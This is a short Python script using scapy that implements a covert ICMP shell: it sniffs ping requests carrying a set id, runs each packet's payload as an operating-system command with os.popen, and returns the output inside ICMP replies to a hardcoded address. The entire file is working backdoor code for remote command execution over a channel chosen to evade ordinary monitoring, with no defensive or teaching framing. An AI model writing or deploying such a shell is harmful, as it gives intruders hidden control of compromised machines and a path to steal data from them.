/usr/bin/python3
import sys
import os
from scapy.all import *
from subprocess import check_output

def icmpshell(pkt):
    pkt.show()
    if pkt[ICMP].type == 8 and pkt[Raw]:
        if pkt[ICMP].id == 19401:
            if pkt[Raw].load:
                #pkt.show()
                newpkt = (pkt[Raw].load).decode('utf-8', errors='ignore')
                #print(newpkt) 
                shelloutput = os.popen(newpkt).readlines()
                print(shelloutput)
                #return os.popen(newpkt).readlines()
                icmppacket = (IP(src="192.168.178.67", dst="192.168.178.71")/ICMP(type=0, id=19000)/Raw(load=shelloutput))
                sr(icmppacket, timeout=0, verbose=0) 
        else:
            print("Something went wrong here")
            #debug:
            #pkt.show()
    else:
        print("something or someone else is sending you ICMP packets")
        #pkt.show()
    
sniff(iface="eth0", prn=icmpshell, filter="icmp", store="0")
